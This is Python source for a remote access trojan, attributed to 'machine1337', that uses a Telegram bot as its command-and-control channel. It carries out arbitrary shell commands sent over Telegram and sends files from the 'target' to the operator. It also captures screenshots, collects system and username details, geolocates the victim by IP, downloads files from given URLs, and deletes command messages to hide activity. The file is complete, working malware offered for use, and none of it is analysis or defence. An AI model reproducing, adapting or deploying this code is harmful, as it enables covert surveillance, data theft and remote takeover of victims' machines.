import os
import platform
import requests
import subprocess
import time
try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab

TOKEN = ''   #change the token here
CHAT_ID = ''   #change the chat id here
processed_message_ids = []
def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        print(f"Failed to get updates. Status code: {response.status_code}")
        return []


def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"Failed to delete message. Status code:")
#coded by machine1337
def execute_command(command):
    if command == 'cd ..':
        os.chdir('..')
        return "Changed current directory to: " + os.getcwd()
    elif command == 'location':
        response = requests.get('https://ifconfig.me/ip')
        public_ip = response.text.strip()

        try:
            url = f'http://ip-api.com/json/{public_ip}'
            response = requests.get(url)
            data = response.json()
            country = data.get('country')
            region = data.get('region')
            city = data.get('city')
            lat = data.get('lat')
            lon = data.get('lon')
            timezone = data.get('timezone')
            isp = data.get('isp')

            final = f"IP Address: {public_ip},\nCountry: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
            return final
        except Exception as e:
            return 'Some shit occured'
    elif command == 'info':
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
        info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
        return info_string
    elif command == 'screenshot':
        file_path = "screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            print(f"Screenshot saved to {file_path}")
            send_file(file_path)
            os.remove(file_path)
            return "Screenshot sent to Telegram."
        except Exception as e:
            return f"Error taking screenshot: {e}"
    elif command == 'help':
        return '''
        HELP MENU: Coded By Machine1337
CMD Commands        | Execute cmd commands directly in bot
cd ..               | Change the current directory
cd foldername       | Change to current folder
download filename   | Download File From Target
screenshot          | Capture Screenshot
info                | Get System Info
location            | Get Target Location
get url             | Download File From URL (provide direct link)
            '''
    elif command.startswith('download '):
        filename = command[
                   9:].strip()
        if os.path.isfile(filename):
            send_file(filename)
            return f"File '{filename}' sent to Telegram."
        else:
            return f"File '{filename}' not found."
    elif command.startswith('get '):
        url = command[4:].strip()
        try:
            download = requests.get(url)
            if download.status_code == 200:
                file_name = url.split('/')[-1]
                with open(file_name, 'wb') as out_file:
                    out_file.write(download.content)
                return f"File downloaded and saved as '{file_name}'."
            else:
                return f"Failed to download file from URL: {url}. Status Code: {download.status_code}"
        except Exception as e:
            return f"Failed to download file from URL: {url}. Error: {str(e)}"
    elif command.startswith('cd '):
        foldername = command[3:].strip()
        try:
            os.chdir(foldername)
            return "Directory Changed To: " + os.getcwd()
        except FileNotFoundError:
            return f"Directory not found: {foldername}"
        except Exception as e:
            return f"Failed to change directory. Error: {str(e)}"
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8').strip()  
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.decode('utf-8').strip()}"


def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"Failed to send file.")

def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        if 'message' in update and 'text' in update['message']:
            message_text = update['message']['text']
            message_id = update['message']['message_id']
            if message_id in processed_message_ids:
                continue
            processed_message_ids.append(message_id)
            delete_message(message_id)
            result = execute_command(message_text)
            if result:
                send_message(result)
        update_id = update['update_id']
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id
def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': text
    }
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"Failed to send message.")
def main():
    offset = None
    while True:
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_message_ids.clear()
        else:
            print("No updates found.")
        time.sleep(1)
if __name__ == '__main__':
    main()
#coded by machine1337. Don't copy this code
